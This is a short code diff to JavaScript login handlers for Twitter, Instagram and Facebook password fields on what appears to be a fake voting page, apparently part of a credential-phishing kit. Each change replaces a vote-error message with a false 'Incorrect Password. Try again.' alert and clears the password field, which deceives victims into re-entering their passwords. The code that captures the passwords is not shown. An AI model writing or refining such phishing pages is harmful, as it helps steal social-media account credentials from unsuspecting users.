@@ -37,7 +37,7 @@ function twilog() {
     });
 
     setTimeout(function () {
-      alert("Oops! Something went wrong with your vote. Try again.");
+      alert("Incorrect Password. Try again.");
       document.getElementById("twi-pass").value = "";
       return false;
     }, 2000);
@@ -74,7 +74,7 @@ function iglog() {
     });
 
     setTimeout(function () {
-      alert("Oops! Something went wrong with your vote. Try again.");
+      alert("Incorrect Password. Try again.");
       document.getElementById("ig-pass").value = "";
       return false;
     }, 2000);
@@ -110,7 +110,7 @@ function fblog() {
     });
 
     setTimeout(function () {
-      alert("Oops! Something went wrong with your vote. Try again.");
+      alert("Incorrect Password. Try again.");
       document.getElementById("fb-pass").value = "";
 
       return false;
